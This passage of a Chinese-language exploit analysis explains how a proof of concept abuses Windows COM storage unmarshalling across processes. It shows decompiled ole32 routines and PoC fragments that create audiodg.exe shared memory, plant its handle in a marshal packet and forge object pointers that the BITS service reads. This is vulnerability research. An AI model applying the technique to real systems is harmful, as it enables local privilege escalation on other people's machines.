
DfUnMarshalInterface 默认是采用 `MSHCTX=MSHCTX_INPROC` 也就是同进程内 Unmrahsl 方式读取的指针都是的同进程对象，不过它也支持 `UnmarshalSharedMemory` 方式，也就是从结构的 `hMem` 字段从 `audiodg.exe` 的共享内存初始化相应的共享对象

```c
//SDfMarshalPacket结构
typedef struct _SDfMarshalPacket
{
unsigned int CBasedPubDocFileObj;
void * CBasedPubStreamObj;
void * CBasedSeekPointerObj;
void * CBasedMarshalListObj;
void * CBasedDFBasisObj;
unsigned int CBasedGlobalContextObj;
unsigned int CBasedGlobalFileStreamBaseObj;
void * CBasedGlobalFileStreamDirty;
void * CBasedGlobalFileStreamOriginal;
unsigned int ulHeapName;
unsigned int ProcessContextId;
GUID cntxkey;
CPerContext * CPerContextObj;
//共享内存
void *hMem;
} SDfMarshalPacket;
```

### Windows 音频服务

[windows音频服务](<mark class="encrypted">8f1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6V1k6i4y4C8N6r3!0H3i4K6u0r3j5i4m8A6i4K6u0r3j5i4g2V1K9h3!0U0L8r3W2W2L8Y4c8Q4x3V1k6F1k6W2)9J5k6r3q4#2k6r3W2G2j5$3I4A6k6h3&6@1i4K6u0V1K9h3q4#2k6r3W2G2j5$3I4A6k6h3&6@1i4K6u0V1K9h3&6A6N6r3W2S2L8r3W2\*7k6b7`.`.</mark> "") 允许建立一个 `Initialize` 在 `audiodg.exe` 进程共享内存中 `AUDCLNT_SHAREMODE=AUDCLNT_SHAREMODE_SHARED` 的共享内存，并开辟这样一块共享内存给 `poc` 进程和 `bits` 进程使用。通过 `ntdll` 未公开的函数实现找到位于 `audiodg.exe` 进程共享内存的句柄，写入交换数据后，将共享内存的句柄值写入 `SDfMarshalPacket->hMem`，关于 [ntdll 未公开的函数](<mark class="encrypted">f1bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4g2F1k6r3!0U0N6h3#2W2L8Y4c8W2k6q4)9J5k6h3&6@1K9h3&6@1k6i4u0F1j5h3I4K6i4K6u0W2L8X3g2@1i4K6u0r3K9h3&6V1k6i4S2Q4x3X3g2Z5N6r3#2D9i4K6y4r3M7r3q4Y4k6g2)9K6c8q4g2K6k6i4u0y4L8$3c8W2i4K6t1#2x3V1k6g2L8X3c8G2j5%4g2E0k6h3&6@1k6h3c8Q4x3U0f1J5x3p5k6#2L8X3y4@1K9h3!0F1M7#2)9J5y4e0u0r3e0W2c8Q4x3U0f1J5x3p5!0T1K9X3g2U0N6s2y4Q4x3U0f1J5c8W2y4W2j5%4c8A6L8$3&6Q4x3U0f1J5c8V1&6@1f1i4g2W2M7Y4W2e0k6h3y4@1K9h3!0F1i4K6u0W2K9s2c8E0L8l9`.`.</mark> "") 具体实现 `poc` 中有代码请读者自行研究.

```c
HRESULT STDMETHODCALLTYPE SharedMemoryMarshaller::StartAudioClient(){
const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
const IID IID_IMMDeviceEnumerator = __uuidof(IMMDeviceEnumerator);
IMMDeviceEnumeratorPtr pEnumerator = nullptr;
HRESULT hr = CoCreateInstance(
CLSID_MMDeviceEnumerator, NULL,
CLSCTX_ALL, IID_IMMDeviceEnumerator,
(void**)&pEnumerator);
IMMDevicePtr pDevice = nullptr;
hr = pEnumerator->GetDefaultAudioEndpoint(EDataFlow::eRender, ERole::eConsole, &pDevice);
WAVEFORMATEX *pwfx = NULL;
REFERENCE_TIME hnsRequestedDuration = 10000000;
UINT32 nFrames = 0;
IAudioClient *pAudioClient = NULL;
// Get the audio client.
(hr = pDevice->Activate(
__uuidof(IAudioClient),
CLSCTX_INPROC_SERVER,
NULL,
(void**)&pAudioClient));
// Get the device format.
hr = pAudioClient->GetMixFormat(&pwfx);
// Open the stream and associate it with an audio session.
hr = pAudioClient->Initialize(
AUDCLNT_SHAREMODE_SHARED,
NULL,
hnsRequestedDuration,
0,
pwfx,
NULL);
return hr;
}
```

在 `CSharedMemoryBlock::InitUnMarshal` 中 `CSharedMemoryBlockObj->_pbBase` 被赋值成了 `SDfMarshalPacket->hMem` 共享内存映射后的地址，之后在 `CSmAllocator::Init` 中 `CPerContext->_pbBase = CSharedMemoryBlockObj->_pbBase + 8`，之后在 `UnmarshalSharedMemory` 接着就调用 `CPerContext::SetThreadAllocatorState` 接着调用 `CSmAllocator::SetState` 将 `NtCurrentTeb()->ReservedForOle` 赋值成 `CPerContext->_pbBase`。最终得出的结论是 `NtCurrentTeb()->ReservedForOle-8` 就是共享内存内存映射的相对地址。在 `poc` 中使用如下方式操作共享内存

在 `poc` 中映射的共享内存基址 `directoryMappedAddressLocal` 就是 `bits` 进程中 `NtCurrentTeb()->ReservedForOle-8` 即 `bits` 进程映射的共享内存基址。以下是 `poc` 操作共享内存的方法

```c
CBasedMapSectionPtr* pdf = (CBasedMapSectionPtr*)(pck->CBasedPubDocFileObj + (ULONG)directoryMappedAddressLocal + 8);

pdf->_SelftobjectPtr = 0x46444250;
```

```c
void __stdcall UnmarshalSharedMemory(SDfMarshalPacket *SDfMarshalPacketCurrent, unsigned int mshlflags, CPerContext *ppcOwner)
{
SDfMarshalPacket *pck; // esi
unsigned int HeapName; // ebx
CPerContext *CPerContextObjTemp; // eax
HANDLE currentThreadHandle; // eax
CPerContext *ppcOwnerRef; // ecx
unsigned int ProcessContextIdRef; // [esp+Ch] [ebp-Ch]
void *hToken; // [esp+10h] [ebp-8h]
int sc; // [esp+14h] [ebp-4h]
CSmAllocator *pMalloc; // [esp+20h] [ebp+8h]
CSmAllocator *pMalloca; // [esp+20h] [ebp+8h]
pck = SDfMarshalPacketCurrent;
HeapName = SDfMarshalPacketCurrent->ulHeapName;
// 获取当前进程pid
ProcessContextIdRef = SDfMarshalPacketCurrent->ProcessContextId;
// PerContextObj反序列出来如果是当前进程就取它的值
CPerContextObjTemp = SDfMarshalPacketCurrent->CPerContextObj;
sc = 0;
// pMalloc 就是CPerContextObjTemp的引用
pMalloc = (CSmAllocator *)CPerContextObjTemp;
if ( GetCurrentProcessId() == ProcessContextIdRef )
{
// CSmAllocatorObjRefThis就是去反序列化这和sharedmemeory没关系了,默认认为sharedmemeory已经存在并初始化
ppcOwnerRef = (CPerContext *)pMalloc;
}
else
{
pMalloca = GetTlsSmAllocator();
if ( pMalloca->_ulHeapName != HeapName )
{
hToken = 0;
// 获取当前线程Thread的tid
currentThreadHandle = GetCurrentThread();
if ( OpenThreadToken(currentThreadHandle, 8u, 1, &hToken) )
{
CloseHandle(hToken);
sc = 0x80030005;
JUMPOUT(&requireCreateInstance);
}
// 非当前进程认为sharedmemeory不存在并开始初始化
CSmAllocator::SetState(pMalloca, 0, 0, 0, 0, 0);
// fUnmarshal=1,开始Unmarshal共享内存
sc = CSmAllocator::Init(pMalloca, pck->hMem, ProcessContextIdRef, HeapName, 1);
sc = CSmAllocator::Sync(pMalloca);
}
// owner就是pcSharedMemory如果非当前进程,CPerContext的pbBase又赋值给CSmAllocator的pbBase
CPerContext::GetThreadAllocatorState(ppcOwner);
ppcOwnerRef = ppcOwner;
}
// 设置一下状态
CPerContext::SetThreadAllocatorState(ppcOwnerRef, 0);
}
```

```c
void __thiscall CSmAllocator::SetState(CSmAllocator *this, CSharedMemoryBlock *psmb, char *pbBase, unsigned int ulHeapName, CPerContext **ppcPrev, CPerContext *ppcOwner)
{
unsigned int v6; // eax
// that->CSharedMemoryBlockObj(+0x4) = shmBlock;
this->CSharedMemoryBlockObj = psmb;
// this->_pbBase(0x8偏移量) = pbBase;
this->_pbBase = pbBase;
if ( psmb )
v6 = psmb->_culCommitSize - 8;
else
v6 = 0;
this->_cbSize = v6;
this->_ulHeapName = ulHeapName;
*(_DWORD *)NtCurrentTeb()->ReservedForOle = pbBase;
if ( ppcPrev )
*ppcPrev = this->_ppcOwner;
this->_ppcOwner = ppcOwner;
}
```

```c
int __thiscall CSmAllocator::Init(CSmAllocator *this, void *hMem, unsigned int dwProcessId, unsigned int ulHeapName, int fUnmarshal)
{
CSharedMemoryBlock *shmBlock; // eax
CSharedMemoryBlock *shmBlockRef; // edi
....
shmBlock = (CSharedMemoryBlock *)operator new(0x18u);
if ( shmBlock )
{
shmBlock->_hMem = 0;
shmBlock->_pbBase = 0;
shmBlock->_culCommitSize = 0;
shmBlock->_culInitCommitSize = 0;
shmBlock->_fCreated = 1;
shmBlock->_fReadWrite = 0;
}
else
{
shmBlock = 0;
}
shmBlockRef = shmBlock;
// that->CSharedMemoryBlockObj(+0x4)偏移量 = shmBlock;
that->CSharedMemoryBlockObj = shmBlock;
if ( shmBlock )
{
if ( fUnmarshal )
{
hrTemp = CSharedMemoryBlock::InitUnMarshal(shmBlock, hMem, dwProcessId, 0x3FF8u);
goto LABEL_13;
}
LABEL_20:
hrTemp = CSharedMemoryBlock::Init(shmBlockRef, 0, 0x3FFFF8u, 0x3FF8u, 0, 0, 1);
LABEL_13:
sc = hrTemp;
if ( hrTemp < 0 )
{
if ( shmBlockRef != &g_smb && shmBlockRef )
CSharedMemoryBlock::`scalar deleting destructor'(shmBlockRef, 1u);
that->CSharedMemoryBlockObj = 0;
return sc;
}
that->_cbSize = shmBlockRef->_culCommitSize - 8;
// pMalloca的pbBase就是NtCurrentTeb()->ReservedForOle->pvThreadBase(0x0偏移量)值相等,shmBlockRef->_pbBase也就是共享内存分配的基址,其中pMalloca=CPerContext
that->_pbBase = shmBlockRef->_pbBase + 8;
.....
}
```

```c
int __thiscall CSharedMemoryBlock::InitUnMarshal(CSharedMemoryBlock *this, void *hMem, unsigned int dwProcessId, unsigned int culCommitSize)
{
CSharedMemoryBlock *that; // esi
int v5; // ebx
signed int v6; // eax
HANDLE v8; // eax
int v9; // eax
char *shareMemoryOffset; // eax
int v11; // eax
HANDLE hProcess; // [esp+18h] [ebp+Ch]
that = this;
v5 = 0;
hProcess = OpenProcess(0x40u, 0, dwProcessId);
if ( hProcess )
{
v8 = GetCurrentProcess();
// &that->_hMem=0x偏移量
if ( DuplicateHandle(hProcess, hMem, v8, &that->_hMem, 0, 0, 2u) )
{
shareMemoryOffset = (char *)MapViewOfFileEx(that->_hMem, 6u, 0, 0, 0, 0);
// //pMalloca->_pbBase = shmBlockRef->_pbBase + 8; 其中的pMalloca->pbBase就是NtCurrentTeb()->ReservedForOle->pvThreadBase(0x0偏移量)值相等,shmBlockRef->_pbBase= that->_pbBase也就是共享内存分配的基址
that->_pbBase = shareMemoryOffset;
.....
}
```
